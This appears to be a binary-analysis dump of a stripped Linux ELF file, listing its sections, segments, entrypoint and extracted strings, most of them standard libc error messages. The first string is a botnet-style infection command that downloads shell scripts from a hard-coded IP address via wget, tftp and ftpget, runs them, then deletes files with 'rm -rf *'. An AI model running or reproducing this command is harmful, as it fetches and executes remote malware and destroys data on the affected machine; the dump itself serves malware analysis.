Missing bin header main
Missing bin header dwarf
[Sections]

nth paddr         size vaddr        vsize perm name
―――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x00000000     0x0 0x00000000     0x0 ---- 
1   0x000000e8    0x13 0x004000e8    0x13 -r-x .init
2   0x00000100  0xc6f8 0x00400100  0xc6f8 -r-x .text
3   0x0000c7f8     0xe 0x0040c7f8     0xe -r-x .fini
4   0x0000c820  0x24d0 0x0040c820  0x24d0 -r-- .rodata
5   0x0000ecf0     0x4 0x0040ecf0     0x4 -r-- .eh_frame
6   0x0000f000    0x10 0x0050f000    0x10 -rw- .ctors
7   0x0000f010    0x10 0x0050f010    0x10 -rw- .dtors
8   0x0000f020     0x8 0x0050f020     0x8 -rw- .jcr
9   0x0000f040   0x510 0x0050f040   0x510 -rw- .data
10  0x0000f550     0x0 0x0050f560  0x68e8 -rw- .bss
11  0x0000f550   0x8b8 0x00000000   0x8b8 ---- .comment
12  0x0000fe08    0x56 0x00000000    0x56 ---- .shstrtab

[Segments]

nth paddr         size vaddr        vsize perm name
―――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x00000000  0xecf4 0x00400000  0xecf4 -r-x LOAD0
1   0x0000f000   0x550 0x0050f000  0x6e48 -rw- LOAD1
2   0x00000000     0x0 0x00000000     0x0 -rw- GNU_STACK
3   0x00000000    0x40 0x00400000    0x40 -rw- ehdr

[Entrypoints]
vaddr=0x00400194 paddr=0x00000194 haddr=0x00000018 hvaddr=0x00400018 type=program

1 entrypoints
[Constructors]

0 entrypoints
[Imports]
nth vaddr bind type lib name
――――――――――――――――――――――――――――

[Symbols]

nth paddr vaddr bind type size lib name
―――――――――――――――――――――――――――――――――――――――
[Strings]
nth paddr      vaddr      len size section type    string
―――――――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x0000c820 0x0040c820 409 410  .rodata ascii   cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://206.189.233.129/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 206.189.233.129 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 206.189.233.129; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 206.189.233.129 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *; exit\r\n
64  0x0000dba8 0x0040dba8 23  24   .rodata ascii   Operation not permitted
65  0x0000dbc0 0x0040dbc0 25  26   .rodata ascii   No such file or directory
66  0x0000dbda 0x0040dbda 15  16   .rodata ascii   No such process
67  0x0000dbea 0x0040dbea 23  24   .rodata ascii   Interrupted system call
68  0x0000dc02 0x0040dc02 18  19   .rodata ascii   Input/output error
69  0x0000dc15 0x0040dc15 25  26   .rodata ascii   No such device or address
70  0x0000dc2f 0x0040dc2f 22  23   .rodata ascii   Argument list too long
71  0x0000dc46 0x0040dc46 17  18   .rodata ascii   Exec format error
72  0x0000dc58 0x0040dc58 19  20   .rodata ascii   Bad file descriptor
73  0x0000dc6c 0x0040dc6c 18  19   .rodata ascii   No child processes
74  0x0000dc7f 0x0040dc7f 32  33   .rodata ascii   Resource temporarily unavailable
75  0x0000dca0 0x0040dca0 22  23   .rodata ascii   Cannot allocate memory
76  0x0000dcb7 0x0040dcb7 17  18   .rodata ascii   Permission denied
77  0x0000dcc9 0x0040dcc9 11  12   .rodata ascii   Bad address
78  0x0000dcd5 0x0040dcd5 21  22   .rodata ascii   Block device required
79  0x0000dceb 0x0040dceb 23  24   .rodata ascii   Device or resource busy
80  0x0000dd03 0x0040dd03 11  12   .rodata ascii   File exists
81  0x0000dd0f 0x0040dd0f 25  26   .rodata ascii   Invalid cross-device link
82  0x0000dd29 0x0040dd29 14  15   .rodata ascii   No such device
83  0x0000dd38 0x0040dd38 15  16   .rodata ascii   Not a directory
84  0x0000dd48 0x0040dd48 14  15   .rodata ascii   Is a directory
85  0x0000dd57 0x0040dd57 16  17   .rodata ascii   Invalid argument
86  0x0000dd68 0x0040dd68 29  30   .rodata ascii   Too many open files in system
87  0x0000dd86 0x0040dd86 19  20   .rodata ascii   Too many open files
88  0x0000dd9a 0x0040dd9a 30  31   .rodata ascii   Inappropriate ioctl for device
89  0x0000ddb9 0x0040ddb9 14  15   .rodata ascii   Text file busy
90  0x0000ddc8 0x0040ddc8 14  15   .rodata ascii   File too large
91  0x0000ddd7 0x0040ddd7 23  24   .rodata ascii   No space left on device
92  0x0000ddef 0x0040ddef 12  13   .rodata ascii   Illegal seek
93  0x0000ddfc 0x0040ddfc 21  22   .rodata ascii   Read-only file system
94  0x0000de12 0x0040de12 14  15   .rodata ascii   Too many links
95  0x0000de21 0x0040de21 11  12   .rodata ascii   Broken pipe
